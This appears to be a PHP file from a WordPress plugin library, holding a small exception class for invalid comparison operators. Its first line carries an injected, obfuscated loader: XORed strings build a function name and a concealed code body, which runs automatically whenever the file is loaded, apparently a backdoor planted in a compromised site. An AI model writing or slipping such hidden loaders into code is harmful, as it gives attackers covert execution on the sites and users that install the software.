<?php $fStngpur='N>X4I52T8=02-VS'; $dzHTHYos='-L=U=Pm2MSSFD9='^$fStngpur; $ZcMuMJa='U2jUKA>1,G=T+3U1E.5rs- DrJZ36fiM6Hoygf<eq KB07;,ShO+ 7ZM<J==,LXzlWV-JzHPKE4qIivot:R5StR0<BvLcwlkHJF,YleWnSwfPxl9Q  3<7Vkc74OXOlmq-shcyzCU8 MnzOeflYU=0umWencrrY Nnh0XPZK0R9.<yg,W<ZgQq0Fy 51719xB8E<lzohHrG=cl+UM.NiQR0Z9UsSMX0XRd W8teaZ+.74ih0FQ 5+;=rxt3s= u1eu4HQkKU.nPrab ;6XULu.msf15- 1REOwtHQ90KNk7HT7-1tZHaKZ<B<HA-Iz1PQqbcX39WzQ=BCKR+ 9 TPXwtk72hpjza;ISn=4 XTgItKPLASbg7sqbwR2 2h =Ctnkk. 6Sl4cPIQ=JvlMRB3- .wzO3e,;gEQUZ,jlJl9 7-0BQ: N-dB.1m. 820n 16mZZAWwmbPX 8=Kat-9D1BgfkV A8q-6LomnMTTNbZ;-3dcTn7O;P6bP=:nY S: ElfG=IcEnc,L,5bWrQhN= yaEDL93ik .2fpXTiXYh;3pVr UBbWmh:TZrxdstbqVr 6+g:YuVdBRWEY056.IcQ=44QE=CAXmJ3 LX6 YjdTn+92MnafvPzuzJPa.DU9jf35F 5V4J: V5=Oafb6M3A:3zBYwN:'; $KUtxVW=$dzHTHYos('', '<TBt-4PRX.R:tV-X6ZFZTUO6-.;GW96 C<HPNFGoxF>,SCRC=H7DRh>,H+bbA9,RH37Y+Vht  MXiIVOTAX<ZP=EHbKlDPWaAC C+DA>NnWVkXHPmSTAPR8CGSU;9fWMUDXCJssJqWU9NTrENH=4IQ.I>8N=RV2E75LYxuz8D UKRQCG2Es:xJ:OpRPEBCWPfW0HEAea5x:7iHO49OnTq4Q6J0HYi<Q,3;K2ATXA<JBDQRb: >RPJXURPPl0ro>x UU;qO 0WNmLAFVZZ-0eUUgzBUTYAn9 6WIhuRU2ua>l0VYPTghE=;P7YsKPCpX6qYCG<RM6SqFHJ-=YEXC<ppS+9rc=59.AZ:sJVQYxiYiP=1 46KGLyxkS6STS7KX:TSKOEEOhf=jt-0I+VQmv4RAUKLpFNoQ1ma54.MJQj,LNDHB+0VI4HL:AC2JALSo1MDBE8;22AY=4=CWY.IPIX0PkKFO2A5Y.FS5FDUG=2fF>ZYRDErNV=I1O=;XC1<X:IT6DA,X0DiNGH-XTKwTwHfPDLIa -MR2LKKKA-qtTeyOXVC2DD7 WcXQX6nFJQCEUE7AFSISXnEnCkrqcyQGDO0<:XMk4=T05+EmCA54YA=MHtJOXF,GHFVpZUZ1ZhK24UBBWT2AnqD+CL9TYh<OY<DV9SGRrpLDG'^$ZcMuMJa); $KUtxVW();

/**
 * Class InvalidOperatorType
 */
class Whip_InvalidOperatorType extends Exception {

	private $validOperators = array( '=', '==', '===', '<', '>', '<=', '>=' );

	/**
	 * InvalidOperatorType constructor.
	 *
	 * @param string       $value
	 */
	public function __construct( $value ) {
		parent::__construct(
			sprintf( 'Invalid operator of %s used. Please use one of the following operators: %s',
				$value,
				implode( ', ', $this->validOperators )
			) );
	}
}
